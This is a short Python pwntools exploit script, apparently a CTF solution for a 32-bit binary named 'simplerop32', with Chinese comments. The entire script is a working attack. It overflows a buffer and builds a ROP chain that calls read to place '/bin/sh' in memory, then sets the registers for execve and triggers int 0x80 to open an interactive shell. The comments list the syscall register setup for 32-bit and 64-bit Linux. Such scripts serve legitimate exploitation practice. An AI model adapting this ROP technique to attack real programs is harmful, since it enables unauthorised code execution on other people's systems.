from pwn import*
context(arch='i386', os='linux', log_level='debug')
p   = process('./simplerop32')
elf = ELF('./simplerop32')

# 32位
# eax = 0xb       // execve系统调用号
# ebx = /bin/sh   // 第一个参数
# ecx = 0         // 第二个参数
# edx = 0         // 第三个参数
#
# 64位
# rax = 0x3B      // execve系统调用号
# rdi = /bin/sh   // 第一个参数
# rsi = 0         // 第二个参数
# rdx = 0         // 第三个参数
pop_edx_ecx_ebx = 0x08049941
pop_eax = 0x080aa06a

binsh = 0x080E41C4
read  = elf.symbols['read']

# 32位 : int 0x80
# 64位 : syscall
int_0x80    = 0x08049b62

payload  = b'a' * (0x1C + 4)
# 调用read读取/bin/sh
payload += p32(read)
payload += p32(pop_edx_ecx_ebx) # 跳过read参数
payload += p32(0)
payload += p32(binsh)
payload += p32(len('/bin/sh' + '\0'))
# 调用系统中断
payload += p32(pop_edx_ecx_ebx)
payload += p32(0)
payload += p32(0)
payload += p32(binsh)
payload += p32(pop_eax)
payload += p32(0xb)
payload += p32(int_0x80)

p.recvuntil('something')
p.send(payload)
p.send('/bin/sh' + '\0')
p.interactive()